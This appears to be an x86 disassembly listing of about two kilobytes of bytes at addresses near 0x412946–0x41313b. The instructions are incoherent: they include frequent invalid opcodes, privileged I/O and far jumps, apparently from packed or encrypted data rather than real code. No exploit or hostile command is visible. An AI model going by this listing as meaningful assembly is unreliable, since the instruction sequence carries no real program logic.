  412946:	push   ebx
  412947:	mov    ah,BYTE PTR [ebx+0x35c775b6]
  41294d:	daa    
  41294e:	mov    al,0x13
  412950:	enter  0xc651,0x2f
  412954:	xor    dh,cl
  412956:	xchg   DWORD PTR [edx+0xe],ebx
  412959:	addr16 cdq 
  41295b:	pop    es
  41295c:	jmp    0x4c9f:0xa38385db
  412963:	sar    BYTE PTR [eiz*4-0x53ee268f],1
  41296a:	jno    0x4129bf
  41296c:	loop   0x412934
  41296e:	cmp    DWORD PTR [ebp+0x37],0xffffff91
  412972:	inc    esp
  412973:	fsubr  QWORD PTR [ecx-0x22cfb4d5]
  412979:	xchg   ebx,eax
  41297a:	push   cs
  41297b:	mov    bh,0x73
  41297d:	outs   dx,DWORD PTR ds:[esi]
  41297e:	jno    0x41291a
  412980:	ret    0xaa1a
  412983:	das    
  412984:	sub    ebp,DWORD PTR [edi]
  412986:	pop    edi
  412987:	inc    ebx
  412988:	fidivr DWORD PTR [edx]
  41298a:	pop    edi
  41298b:	jl     0x4129b5
  41298d:	mov    al,0xe0
  41298f:	lods   al,BYTE PTR ds:[esi]
  412990:	push   ebp
  412991:	clc    
  412992:	sub    eax,DWORD PTR [ebx]
  412994:	adc    edx,DWORD PTR [eax+0x1c]
  412997:	sti    
  412998:	retf   
  412999:	enter  0xa6e,0xe6
  41299d:	and    al,0x3f
  41299f:	or     BYTE PTR [edi-0x27996951],0x62
  4129a6:	jns    0x4129aa
  4129a8:	(bad)  
  4129a9:	push   esp
  4129aa:	xor    BYTE PTR [ebx],bl
  4129ac:	lds    edx,FWORD PTR [eax+ebp*4-0x394e309a]
  4129b3:	jle    0x4129ce
  4129b5:	repz rcl BYTE PTR [eax+ebp*8+0x18],1
  4129ba:	test   BYTE PTR [ecx+0x147d222],ch
  4129c0:	cmp    edi,DWORD PTR [edx]
  4129c2:	and    ebx,DWORD PTR [edi+0x6e]
  4129c5:	xchg   edx,eax
  4129c6:	loope  0x41294b
  4129c8:	sar    DWORD PTR [ecx],1
  4129ca:	fiadd  DWORD PTR [edx+eiz*8+0x39]
  4129ce:	ficomp WORD PTR ds:0xcf20f7ff
  4129d4:	fisttp DWORD PTR [ebx]
  4129d6:	jbe    0x412a20
  4129d8:	jbe    0x412a57
  4129da:	and    eax,0x534cb893
  4129df:	loop   0x412a2e
  4129e1:	push   ecx
  4129e2:	cli    
  4129e3:	enter  0xdf34,0x1f
  4129e7:	mov    edi,0xe76ecfda
  4129ec:	ret    
  4129ed:	push   ss
  4129ee:	out    0x8a,al
  4129f0:	(bad)  
  4129f2:	push   0xffffff9b
  4129f4:	test   al,0xd7
  4129f6:	jmp    DWORD PTR [eax]
  4129f8:	cwde   
  4129f9:	lods   eax,DWORD PTR ds:[esi]
  4129fa:	push   ecx
  4129fb:	dec    esi
  4129fc:	cmp    BYTE PTR ds:0xa0c81e1e,dh
  412a02:	stc    
  412a03:	std    
  412a04:	push   0x3f
  412a06:	mov    eax,0xd15f40fe
  412a0b:	add    edx,ebp
  412a0d:	dec    ebp
  412a0e:	out    dx,eax
  412a0f:	push   cs
  412a10:	jne    0x4129d9
  412a12:	pusha  
  412a13:	out    dx,eax
  412a14:	sbb    BYTE PTR [esi+esi*4],bh
  412a17:	pop    ecx
  412a18:	dec    edx
  412a19:	inc    esi
  412a1a:	bound  eax,QWORD PTR [ecx-0x3f4f2511]
  412a20:	mov    dl,0x56
  412a22:	pusha  
  412a23:	fld    DWORD PTR [ebx+0x33]
  412a26:	adc    ebp,ecx
  412a28:	jg     0x4129f5
  412a2a:	sbb    BYTE PTR [eax+0x19],dl
  412a2d:	pop    ebx
  412a2e:	and    al,0x39
  412a30:	(bad)  [edi]
  412a32:	pop    esp
  412a33:	imul   ebx,ebx,0xffffff9a
  412a36:	test   DWORD PTR [ebx-0x76],esp
  412a39:	(bad)  
  412a3a:	(bad)  
  412a3b:	ja     0x412a8a
  412a3d:	sbb    DWORD PTR [ecx-0x1e754f31],esi
  412a43:	ds ds dec ebp
  412a46:	inc    ebx
  412a47:	sti    
  412a48:	aam    0x30
  412a4a:	lods   al,BYTE PTR ds:[esi]
  412a4b:	and    eax,DWORD PTR [ecx]
  412a4d:	fs int3 
  412a4f:	pop    ebp
  412a50:	push   esp
  412a51:	add    dl,dl
  412a53:	xlat   BYTE PTR ds:[ebx]
  412a54:	mov    ch,BYTE PTR [eax-0x548bd4e1]
  412a5a:	js     0x412aba
  412a5c:	fmul   st,st(2)
  412a5e:	pop    ss
  412a5f:	test   DWORD PTR [esi],ebp
  412a61:	popf   
  412a62:	xor    bl,bl
  412a64:	sub    BYTE PTR [ecx+0xb],bl
  412a67:	push   ss
  412a68:	call   0xb8358090
  412a6d:	addr16 sbb bl,bl
  412a70:	xor    BYTE PTR [edi-0x52e539c9],0x6d
  412a77:	in     al,0x6e
  412a79:	cdq    
  412a7a:	add    DWORD PTR [ebx+edi*8+0xab2a76a],eax
  412a81:	test   dh,dl
  412a83:	shl    DWORD PTR [edx],0xb2
  412a86:	(bad)  
  412a87:	ror    BYTE PTR gs:[esi+0x572a0bd2],1
  412a8e:	push   0x2b24b1a
  412a93:	out    0x71,al
  412a95:	jmp    0x3709:0xd3e04612
  412a9c:	fstp   QWORD PTR [eax]
  412a9e:	push   es
  412a9f:	int    0x73
  412aa1:	or     al,0xa9
  412aa3:	sbb    al,0xa9
  412aa5:	test   eax,0x7d738a3c
  412aaa:	xor    DWORD PTR [ecx+0x66c09afa],esi
  412ab0:	xor    al,0xc3
  412ab2:	jmp    0x50a66535
  412ab7:	push   esi
  412ab8:	mov    dl,dh
  412aba:	push   cs
  412abb:	adc    al,0xdd
  412abd:	push   ebx
  412abe:	mov    esp,0xafff17eb
  412ac3:	std    
  412ac4:	mov    ah,0x43
  412ac6:	pop    eax
  412ac7:	cli    
  412ac8:	xchg   cx,ax
  412aca:	push   cs
  412acb:	push   ebx
  412acc:	pop    ebx
  412acd:	jl     0x412aab
  412acf:	mov    ds:0x2f8c4cfe,eax
  412ad4:	pop    eax
  412ad5:	das    
  412ad6:	pusha  
  412ad7:	retf   0xbf03
  412ada:	les    edi,FWORD PTR [edx+0x70799ff4]
  412ae0:	fisub  WORD PTR [ebx]
  412ae2:	sbb    ecx,0x420ee79c
  412ae8:	or     eax,0xb4abc843
  412aed:	pusha  
  412aee:	jmp    0x412aa7
  412af0:	lods   eax,DWORD PTR ds:[esi]
  412af1:	test   BYTE PTR [ebx],0x8d
  412af4:	adc    esp,esp
  412af6:	mov    ah,0x31
  412af8:	pop    esi
  412af9:	arpl   WORD PTR [ebp-0x36abe809],ax
  412aff:	call   0xe5c810f8
  412b04:	retf   0x6725
  412b07:	cmp    eax,0xc1d6d541
  412b0c:	ficom  WORD PTR [ebx+0x2e]
  412b0f:	sbb    cl,ch
  412b11:	mov    ebx,0xc40dd7dd
  412b16:	(bad)  
  412b17:	dec    ebx
  412b18:	push   esp
  412b19:	dec    eax
  412b1a:	push   cs
  412b1b:	cmp    DWORD PTR [ebx+0x50cacade],0x9f61564a
  412b25:	jle    0x412b8d
  412b27:	mov    ch,0x64
  412b29:	push   es
  412b2a:	out    dx,al
  412b2b:	fdivr  DWORD PTR [ebx-0x29]
  412b2e:	jmp    0x412b26
  412b30:	mov    al,0xc8
  412b32:	lods   eax,DWORD PTR ds:[esi]
  412b33:	aaa    
  412b34:	pop    ss
  412b35:	fcom   QWORD PTR [edi+0x7d]
  412b38:	ins    BYTE PTR es:[edi],dx
  412b39:	cwde   
  412b3a:	or     BYTE PTR [edi+ebx*4],ch
  412b3d:	add    ch,al
  412b3f:	dec    esi
  412b40:	in     eax,dx
  412b41:	mov    al,0xf2
  412b43:	cmp    DWORD PTR [esi+0x350192c1],esp
  412b49:	mov    cs,ecx
  412b4b:	bound  edi,QWORD PTR [ecx+0x43]
  412b4e:	cdq    
  412b4f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412b50:	sti    
  412b51:	sahf   
  412b52:	mov    ds:0x8b8c5a48,eax
  412b57:	sbb    ecx,DWORD PTR [esi+0x2e]
  412b5a:	shl    BYTE PTR [esi+0x12f137f8],1
  412b60:	(bad)  
  412b61:	sar    BYTE PTR [eax+ebx*8+0x53efb732],cl
  412b68:	lods   eax,DWORD PTR ds:[esi]
  412b69:	push   ss
  412b6a:	test   al,0xfa
  412b6c:	rep movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412b6e:	fdivp  st(6),st
  412b70:	add    dl,al
  412b72:	adc    al,0x8d
  412b74:	scas   eax,DWORD PTR es:[edi]
  412b75:	imul   edx,DWORD PTR [edi],0x2ab4496f
  412b7b:	pop    ds
  412b7c:	xor    eax,0x80f91e76
  412b81:	xor    ecx,DWORD PTR [ecx]
  412b83:	sub    ah,BYTE PTR [ebx-0x26c3f1bb]
  412b89:	mov    ds:0x369a9e39,al
  412b8e:	jb     0x412b70
  412b90:	add    eax,0x599ddfc
  412b95:	dec    ecx
  412b96:	out    0x25,al
  412b98:	pop    esi
  412b99:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412b9a:	sbb    eax,0x2182703a
  412b9f:	adc    esp,edi
  412ba1:	cmp    eax,0x43fdacd7
  412ba6:	je     0x412b43
  412ba8:	aas    
  412ba9:	jae    0x412b7c
  412bab:	rol    dh,0x5f
  412bae:	push   ebx
  412baf:	daa    
  412bb0:	push   ebx
  412bb1:	(bad)
  412bb4:	bound  ebp,QWORD PTR fs:[ebx]
  412bb7:	jecxz  0x412c35
  412bb9:	sbb    bh,BYTE PTR [eax]
  412bbb:	inc    eax
  412bbc:	ret    0xa61f
  412bbf:	jae    0x412c0f
  412bc1:	xchg   edi,eax
  412bc2:	shl    eax,cl
  412bc4:	add    BYTE PTR [ebp+ebx*2+0x4b0077d9],0x7
  412bcc:	jmp    0x5f67d18c
  412bd1:	xor    BYTE PTR [esi-0x11ea7e31],dl
  412bd7:	adc    edi,DWORD PTR [ebp-0x5c]
  412bda:	aaa    
  412bdb:	sbb    al,0xda
  412bdd:	mov    WORD PTR [ebx+edi*2-0x645fda4d],ss
  412be4:	cmp    BYTE PTR [edi-0x5dc42dc5],dl
  412bea:	and    eax,0xaa26ff76
  412bef:	jmp    0x87ecf33e
  412bf4:	xchg   esi,eax
  412bf5:	sub    esp,DWORD PTR [esi+0x16]
  412bf8:	mov    cs,WORD PTR [eax+ebp*8]
  412bfb:	repnz neg BYTE PTR [ebp+0x44f99b20]
  412c02:	les    ecx,FWORD PTR [edi]
  412c04:	adc    DWORD PTR ds:0x9801381,esp
  412c0a:	mov    BYTE PTR [esi+0x3fbb6b68],ah
  412c10:	push   0xf0f1aa36
  412c15:	pop    edx
  412c16:	xor    eax,0x366c9647
  412c1b:	ins    BYTE PTR es:[edi],dx
  412c1c:	cdq    
  412c1d:	sar    DWORD PTR [ebp-0x64337ac8],0xcd
  412c24:	cmp    DWORD PTR [esi-0x49],0x83ab4de8
  412c2b:	push   DWORD PTR ds:0x3d9f6493
  412c31:	iret   
  412c32:	sbb    eax,0x45b17828
  412c37:	push   esi
  412c38:	pop    ds
  412c39:	jne    0x412c1a
  412c3b:	mov    ah,0xa0
  412c3d:	call   0xac39255b
  412c42:	inc    esi
  412c43:	xlat   BYTE PTR ds:[ebx]
  412c44:	pop    ebx
  412c45:	ds and al,0x56
  412c48:	or     al,BYTE PTR [eax]
  412c4a:	lods   eax,DWORD PTR ds:[esi]
  412c4b:	loop   0x412cc0
  412c4d:	and    cl,bl
  412c4f:	js     0x412c15
  412c51:	push   ss
  412c52:	sti    
  412c53:	inc    ecx
  412c54:	sub    cl,ch
  412c56:	add    eax,0x85143f4c
  412c5b:	jp     0x412c27
  412c5d:	push   cs
  412c5e:	jno    0x412ca6
  412c60:	and    eax,0xb58d5a3d
  412c65:	cmp    al,0x2e
  412c67:	pop    ecx
  412c68:	outs   dx,DWORD PTR ds:[esi]
  412c69:	cld    
  412c6a:	sbb    edi,DWORD PTR [esi-0x40e2795f]
  412c70:	adc    ch,BYTE PTR ds:0x6c17ad8
  412c76:	outs   dx,BYTE PTR ds:[esi]
  412c77:	pop    esi
  412c78:	aam    0x33
  412c7a:	pusha  
  412c7b:	js     0x412c27
  412c7d:	mov    esp,ss
  412c7f:	in     eax,dx
  412c80:	cmp    BYTE PTR [ebx-0x415ee233],bh
  412c86:	stc    
  412c87:	or     eax,0x100b01d2
  412c8c:	mov    ah,0xa7
  412c8e:	jbe    0x412c65
  412c90:	ds dec ecx
  412c92:	daa    
  412c93:	xchg   edi,eax
  412c94:	push   cs
  412c95:	fwait
  412c96:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412c97:	mov    edx,0x1051d51c
  412c9c:	xchg   DWORD PTR [ebp+0x55b8f5b7],edi
  412ca2:	add    DWORD PTR [esi],0x16
  412ca5:	arpl   WORD PTR [edx+0x5182c6ff],bp
  412cab:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412cac:	retf   0x312b
  412caf:	jnp    0x412cae
  412cb1:	int    0x73
  412cb3:	int3   
  412cb4:	imul   edi,DWORD PTR [edx+0x44e0d687],0x6cd04d40
  412cbe:	mov    ecx,0xce90b49
  412cc3:	jp     0x412d06
  412cc5:	and    esi,DWORD PTR ds:0x12c128d9
  412ccb:	dec    ebx
  412ccc:	dec    eax
  412ccd:	cmp    BYTE PTR [ebx-0x19],cl
  412cd0:	mov    edx,0x89b1a6db
  412cd5:	push   es
  412cd6:	sbb    BYTE PTR [esi+0x687c353a],cl
  412cdc:	outs   dx,DWORD PTR ds:[esi]
  412cdd:	les    edx,FWORD PTR [ebp-0x2b1b95f9]
  412ce3:	add    BYTE PTR [esi],bl
  412ce5:	test   DWORD PTR [edx],esp
  412ce7:	cmp    esp,DWORD PTR [bp+di-0x42]
  412ceb:	stos   BYTE PTR es:[edi],al
  412cec:	cmp    al,0xf8
  412cee:	aam    0xdb
  412cf0:	jb     0x412d46
  412cf2:	repz retf 
  412cf4:	das    
  412cf5:	sub    eax,0x60e245b5
  412cfa:	sub    eax,0x8d4b3fd4
  412cff:	punpckhdq mm4,mm6
  412d02:	push   0xb292ba9e
  412d07:	bound  ebp,QWORD PTR [eax-0x32]
  412d0a:	jp     0x412ccb
  412d0c:	sub    ecx,eax
  412d0e:	sbb    esi,DWORD PTR [edx-0xe]
  412d11:	in     al,dx
  412d12:	add    eax,0xe06db99c
  412d17:	ficom  DWORD PTR [ebx*4+0x36ea01c5]
  412d1e:	dec    dl
  412d20:	mov    edx,0xfe9c5dcf
  412d25:	fs fstp st(1)
  412d28:	mov    ds:0x850ae755,eax
  412d2d:	mov    dl,0x25
  412d2f:	jge    0x412cb8
  412d31:	loope  0x412d15
  412d33:	push   ebp
  412d34:	pop    eax
  412d35:	and    cl,BYTE PTR [ecx]
  412d37:	popf   
  412d38:	into   
  412d39:	lods   eax,DWORD PTR ds:[esi]
  412d3a:	stos   BYTE PTR es:[edi],al
  412d3b:	std    
  412d3c:	and    al,0x2f
  412d3e:	(bad)
  412d42:	scas   al,BYTE PTR es:[edi]
  412d43:	js     0x412ccf
  412d45:	call   0x5b769052
  412d4a:	jle    0x412d73
  412d4c:	mov    al,ds:0x89bc3b97
  412d51:	leave  
  412d52:	stos   BYTE PTR es:[edi],al
  412d53:	inc    ecx
  412d54:	mov    edi,0x17f2f943
  412d59:	jb     0x412d53
  412d5b:	cdq    
  412d5c:	xchg   edx,eax
  412d5d:	scas   eax,DWORD PTR es:[edi]
  412d5e:	xchg   edi,eax
  412d5f:	hlt    
  412d60:	sti    
  412d61:	pop    eax
  412d62:	pop    esp
  412d63:	aam    0x4f
  412d65:	mov    esi,0xfb1fd0a8
  412d6a:	xor    ecx,DWORD PTR [ebx*1+0x213e38c0]
  412d71:	jo     0x412dc5
  412d73:	push   edx
  412d74:	mov    edi,0xd22d5ea0
  412d79:	and    al,0x62
  412d7b:	jecxz  0x412d82
  412d7d:	cmp    eax,0xba848ee2
  412d82:	dec    esi
  412d83:	lock add eax,0xac7049aa
  412d89:	dec    edx
  412d8a:	ins    BYTE PTR es:[edi],dx
  412d8b:	sub    edi,edx
  412d8d:	lock mov esi,0xbd1c778
  412d93:	aam    0xbc
  412d95:	pop    ebp
  412d96:	hlt    
  412d97:	outs   dx,DWORD PTR ds:[esi]
  412d98:	jno    0x412de7
  412d9a:	ins    BYTE PTR es:[edi],dx
  412d9b:	add    ebp,edx
  412d9d:	bound  eax,QWORD PTR [edi]
  412d9f:	mov    edi,0xc1e0b2e
  412da4:	lds    ebp,FWORD PTR [esp+edx*8+0x1424457e]
  412dab:	fsub   DWORD PTR [eax]
  412dad:	aaa    
  412dae:	stos   DWORD PTR es:[edi],eax
  412daf:	inc    esi
  412db0:	add    DWORD PTR [ebx],edx
  412db2:	mov    ds:0x7a00643d,eax
  412db7:	cmp    ebp,DWORD PTR ds:[ebp-0x27]
  412dbb:	mov    dl,0x75
  412dbd:	sahf   
  412dbe:	jne    0x412d95
  412dc0:	jge    0x412d79
  412dc2:	push   ebp
  412dc3:	pop    es
  412dc4:	dec    edx
  412dc5:	xor    DWORD PTR [edx-0x57d872b4],edx
  412dcb:	mov    bh,0x98
  412dcd:	add    al,BYTE PTR [esi]
  412dcf:	push   eax
  412dd0:	iret   
  412dd1:	push   ss
  412dd2:	and    BYTE PTR [ecx+0x1b],0x86
  412dd6:	jb     0x412d91
  412dd8:	dec    eax
  412dd9:	mov    eax,0x4b2fb9af
  412dde:	int    0xc6
  412de0:	inc    esp
  412de1:	add    eax,0x8100a936
  412de6:	push   edx
  412de7:	jmp    0xb11a:0x3ba6bec
  412dee:	jne    0x412de3
  412df0:	cmp    al,0x2b
  412df2:	mov    edi,0x279130cc
  412df7:	in     eax,0x20
  412df9:	gs js  0x412e4f
  412dfc:	jmp    0x4c30f079
  412e01:	xchg   edx,eax
  412e02:	(bad)  
  412e03:	mov    ecx,0x641b159b
  412e08:	inc    esp
  412e09:	int    0xa7
  412e0b:	sub    DWORD PTR [ebx],edx
  412e0d:	mov    WORD PTR [edi-0x55707466],ss
  412e13:	pop    ds
  412e14:	cli    
  412e15:	pop    ebx
  412e16:	repnz xor bh,dl
  412e19:	cmp    BYTE PTR [ebx],bh
  412e1b:	pop    ss
  412e1c:	out    0xf1,al
  412e1e:	mov    esi,0xb03e24f5
  412e23:	add    dl,BYTE PTR [edi-0x22]
  412e26:	fsubr  QWORD PTR [eax-0x7d]
  412e29:	cli    
  412e2a:	jmp    0x412eaa
  412e2c:	sahf   
  412e2d:	dec    ebx
  412e2e:	mov    ecx,0x6990fc23
  412e33:	popf   
  412e34:	xchg   esi,eax
  412e35:	neg    BYTE PTR [edi-0x728391fc]
  412e3b:	leave  
  412e3c:	ja     0x412eb7
  412e3e:	call   0xcf520c6b
  412e43:	fucomi st,st(3)
  412e45:	or     al,0x56
  412e47:	ret    
  412e48:	stc    
  412e49:	das    
  412e4a:	sub    al,0xf8
  412e4c:	hlt    
  412e4d:	push   es
  412e4e:	adc    BYTE PTR [esp+ebx*4],dh
  412e51:	outs   dx,DWORD PTR ds:[esi]
  412e52:	push   0xea0f7e43
  412e57:	lods   eax,DWORD PTR ds:[esi]
  412e58:	shr    DWORD PTR [ebp+0x63],0xf
  412e5c:	xor    eax,0x3b1c18f
  412e61:	push   edi
  412e62:	test   DWORD PTR [eax-0x40],0xb52d18cf
  412e69:	nop
  412e6a:	loope  0x412e49
  412e6c:	call   0xfae9:0xebb0170a
  412e73:	jns    0x412e73
  412e75:	shl    BYTE PTR [eax+0x25d1daf6],1
  412e7b:	or     al,0xab
  412e7d:	mov    al,ds:0x1f87ab3b
  412e82:	push   ebp
  412e83:	rcl    DWORD PTR [ebp-0x8],0xed
  412e87:	out    0xf,al
  412e89:	dec    eax
  412e8a:	fs ret 
  412e8c:	(bad)  
  412e8d:	push   ebp
  412e8e:	dec    esi
  412e8f:	jmp    0xf527:0xda5a9034
  412e96:	ret    0xd2c3
  412e99:	popaw  
  412e9b:	lock xchg edx,eax
  412e9d:	mov    cl,0xa5
  412e9f:	shl    DWORD PTR [edi-0x16b5ffb6],cl
  412ea5:	xchg   esp,eax
  412ea6:	das    
  412ea7:	xchg   edx,eax
  412ea8:	in     eax,0x98
  412eaa:	js     0x412f01
  412eac:	js     0x412e6a
  412eae:	dec    edx
  412eaf:	cmc    
  412eb0:	call   0x840a:0x828463c3
  412eb7:	xlat   BYTE PTR ds:[ebx]
  412eb8:	(bad)  
  412eba:	pop    ss
  412ebb:	push   esp
  412ebc:	push   esp
  412ebd:	or     al,0xf3
  412ebf:	fisub  WORD PTR [esi+0x7b]
  412ec2:	adc    eax,0xfb0c7451
  412ec7:	mov    eax,0x16c137f0
  412ecc:	pop    ebp
  412ecd:	leave  
  412ece:	(bad)  
  412ecf:	hlt    
  412ed0:	mov    eax,ds:0x506cd238
  412ed5:	jle    0x412ee6
  412ed7:	and    DWORD PTR [esi-0x6efcb0aa],eax
  412edd:	add    BYTE PTR [ebp-0x26cac7e1],ch
  412ee3:	sbb    DWORD PTR [ebx],0x6e0fb18b
  412ee9:	dec    edi
  412eea:	or     DWORD PTR [edx+0x661214b3],0x62
  412ef1:	mov    esp,0x2348eca3
  412ef6:	push   edi
  412ef7:	push   es
  412ef8:	loopne 0x412e8c
  412efa:	out    dx,eax
  412efb:	adc    BYTE PTR [esi+eiz*4+0x5],0x9f
  412f00:	retf   
  412f01:	rol    BYTE PTR [eax],cl
  412f03:	mov    esp,DWORD PTR [esi]
  412f05:	sti    
  412f06:	repnz outs dx,BYTE PTR ds:[esi]
  412f08:	mov    ecx,0x68b7ddec
  412f0d:	fmul   QWORD PTR [ebx]
  412f0f:	push   ebx
  412f10:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412f11:	xchg   esi,eax
  412f12:	mov    dl,0xfd
  412f14:	add    DWORD PTR [ebx],esi
  412f16:	idiv   BYTE PTR [edx]
  412f18:	mov    edi,0x19ca50fa
  412f1d:	mov    dh,0x23
  412f1f:	inc    edi
  412f20:	in     al,0x34
  412f22:	pop    ebp
  412f23:	mov    al,ds:0xdfe0b62b
  412f28:	add    al,0x98
  412f2a:	cld    
  412f2b:	popa   
  412f2c:	jo     0x412f88
  412f2e:	(bad)  
  412f2f:	jl     0x412f17
  412f31:	loopne 0x412f16
  412f33:	cmp    ah,cl
  412f35:	imul   esi,DWORD PTR [ebx+esi*1-0x5],0x1741621d
  412f3d:	gs (bad) 
  412f3f:	mov    edx,0x3a2ea2bd
  412f44:	cli    
  412f45:	nop
  412f46:	cmp    dl,BYTE PTR [edx]
  412f48:	adc    edi,DWORD PTR ds:0x993da466
  412f4e:	mov    ebp,0xa750f5c0
  412f53:	sub    ebx,esi
  412f55:	mov    al,ds:0xe12b8a40
  412f5a:	jae    0x412f9d
  412f5c:	(bad)  
  412f5d:	retf   
  412f5e:	jmp    0x27d8:0x9baf2ddf
  412f65:	aad    0x26
  412f67:	ret    0xfd4f
  412f6a:	sti    
  412f6b:	lods   al,BYTE PTR ds:[esi]
  412f6c:	pop    edi
  412f6d:	(bad)  
  412f6e:	fcom   DWORD PTR [ebx+0x21de4d79]
  412f74:	xor    esp,esi
  412f76:	adc    al,0x2c
  412f78:	mov    cl,0xe3
  412f7a:	stos   BYTE PTR es:[edi],al
  412f7b:	xchg   ebp,eax
  412f7c:	adc    edi,DWORD PTR [ebx]
  412f7e:	ds (bad) 
  412f80:	jmp    0xee69:0x194df064
  412f87:	ror    DWORD PTR [bp+0x52],cl
  412f8b:	xchg   ebp,eax
  412f8c:	sub    al,0xb8
  412f8e:	cmp    dl,al
  412f90:	jo     0x412f32
  412f92:	sbb    ebx,edx
  412f94:	cmp    eax,0xe4a63623
  412f99:	mov    ch,0xe8
  412f9b:	dec    esp
  412f9c:	xlat   BYTE PTR ds:[ebx]
  412f9d:	and    ch,dl
  412f9f:	scas   eax,DWORD PTR es:[edi]
  412fa0:	gs aam 0x29
  412fa3:	stc    
  412fa4:	imul   ecx,DWORD PTR [eax],0x3da8e272
  412faa:	sub    eax,0x86760d57
  412faf:	mov    edx,0xbdef317d
  412fb4:	dec    esi
  412fb5:	mov    ds:0x147432a,al
  412fba:	pop    eax
  412fbb:	pop    ecx
  412fbc:	pop    esi
  412fbd:	dec    DWORD PTR [eax]
  412fbf:	iret   
  412fc0:	mov    BYTE PTR [ecx],dh
  412fc2:	fwait
  412fc3:	and    al,0x42
  412fc5:	in     al,dx
  412fc6:	mov    al,BYTE PTR [edi]
  412fc8:	jo     0x413048
  412fca:	ret    
  412fcb:	jo     0x412f7b
  412fcd:	cld    
  412fce:	ins    DWORD PTR es:[edi],dx
  412fcf:	cmp    eax,0x84d0a980
  412fd4:	ds sahf 
  412fd6:	inc    edx
  412fd7:	lds    eax,FWORD PTR ds:0x230aa78c
  412fdd:	sbb    al,0x19
  412fdf:	int3   
  412fe0:	push   es
  412fe1:	xchg   BYTE PTR [ebx+0x7a],bh
  412fe4:	push   0x7a5beb7c
  412fe9:	repz sbb eax,0x7d023c8f
  412fef:	(bad)  
  412ff0:	mov    esi,0xb37d1d3b
  412ff5:	adc    bh,BYTE PTR [edx]
  412ff7:	(bad)  
  412ff8:	in     eax,dx
  412ff9:	bound  ebp,QWORD PTR [edx+0x2e]
  412ffc:	xor    ch,BYTE PTR [ebp+0x7b]
  412fff:	std    
  413000:	stos   DWORD PTR es:[edi],eax
  413001:	mov    ebx,ss
  413003:	pop    ss
  413004:	ja     0x412fda
  413006:	pop    ds
  413007:	shl    BYTE PTR [esi-0x15],cl
  41300a:	mov    cl,0xb5
  41300c:	pop    esp
  41300d:	stos   BYTE PTR es:[edi],al
  41300e:	call   0x413b9aee
  413013:	hlt    
  413014:	aaa    
  413015:	cmp    BYTE PTR [ecx-0x39b74c9b],ah
  41301b:	aas    
  41301c:	push   ss
  41301d:	test   al,0xb3
  41301f:	(bad)  
  413020:	mov    ecx,0x18129197
  413025:	aaa    
  413026:	dec    ecx
  413027:	adc    al,0xf3
  413029:	int3   
  41302a:	push   ss
  41302b:	mov    ds:0xf485396a,al
  413030:	add    al,0x63
  413032:	pop    ecx
  413033:	sahf   
  413034:	mov    ah,0xd5
  413036:	xor    eax,0xec4d69e0
  41303b:	test   BYTE PTR [ebp-0x669de548],0x78
  413042:	js     0x413000
  413044:	in     al,0xd9
  413046:	push   0x4dbd086d
  41304b:	fisub  WORD PTR [ebx-0x49089d2]
  413051:	retf   
  413052:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413053:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413054:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413055:	pop    edi
  413056:	mov    esi,0xc3e13e91
  41305b:	div    ah
  41305d:	aad    0x14
  41305f:	mov    dh,0x5c
  413061:	sub    DWORD PTR [eax-0x22500547],0xc14d7f53
  41306b:	sahf   
  41306c:	dec    esp
  41306d:	mov    ebp,0x861a56f3
  413072:	mov    ah,0x8b
  413074:	sar    DWORD PTR [ecx+ecx*8+0x73],0x7f
  413079:	jl     0x4130af
  41307b:	lahf   
  41307c:	cwde   
  41307d:	cs out 0x32,eax
  413080:	sub    eax,0x59a8a0c1
  413085:	jno    0x4130ce
  413087:	enter  0x4fa1,0xed
  41308b:	mov    cl,0x79
  41308d:	xor    ecx,DWORD PTR [edi+0x15]
  413090:	cmp    al,0x50
  413092:	mov    al,0x74
  413094:	push   eax
  413095:	push   edx
  413096:	cmp    edi,DWORD PTR [edx+0x66]
  413099:	cmp    eax,0xb2819cd9
  41309e:	jmp    0xfa39:0x4ae65af9
  4130a5:	cld    
  4130a6:	fnstsw WORD PTR [eax]
  4130a8:	shl    DWORD PTR [ebp+0x3e594d35],0x57
  4130af:	mov    ecx,0x1083a341
  4130b4:	sub    eax,0xa54da3a0
  4130b9:	or     eax,0x678129c9
  4130be:	pop    ss
  4130bf:	(bad)  [ebx]
  4130c1:	mov    ch,0x5d
  4130c3:	sbb    edi,DWORD PTR [edx]
  4130c5:	imul   esp,ecx,0x5516b096
  4130cb:	mov    edi,0xbe4030fe
  4130d0:	je     0x413112
  4130d2:	mov    cl,0x92
  4130d4:	push   ebp
  4130d5:	mov    bl,0x3a
  4130d7:	push   ebx
  4130d8:	push   0xa91c5046
  4130dd:	(bad)  
  4130df:	ja     0x4130d3
  4130e1:	sbb    al,0x48
  4130e3:	dec    ecx
  4130e4:	shl    DWORD PTR [ebx-0x2f],1
  4130e7:	or     cl,dl
  4130e9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4130ea:	nop
  4130eb:	ja     0x4130ae
  4130ed:	lahf   
  4130ee:	rcl    esp,0xca
  4130f1:	imul   ebx,DWORD PTR [edx-0x2c0afd66],0xffffffc3
  4130f8:	stc    
  4130f9:	push   eax
  4130fa:	inc    ebx
  4130fb:	and    al,BYTE PTR [eax+0x11b466c1]
  413101:	sbb    ecx,DWORD PTR [eax]
  413103:	lods   al,BYTE PTR ds:[esi]
  413104:	pop    esi
  413105:	inc    ebp
  413106:	(bad)  [esi]
  413108:	pop    ebp
  413109:	or     ch,BYTE PTR [ecx+eiz*4-0x26120bfa]
  413110:	mov    ah,0x5a
  413112:	and    ecx,edx
  413114:	push   edx
  413115:	xor    al,BYTE PTR [ebx-0x1f9cc96a]
  41311b:	jmp    0x940f:0xdbccb98e
  413122:	js     0x41316c
  413124:	xchg   edx,eax
  413125:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413126:	in     eax,0x7c
  413128:	push   0xffffffa6
  41312a:	mov    DWORD PTR [esi+edi*2],0xc3e5ceaa
  413131:	jne    0x41317a
  413133:	fmul   st(0),st
  413135:	into   
  413136:	mov    bh,0x83
  413138:	addr16 jno 0x4130dd
  41313b:	mov    eax,0x8d25d4d9
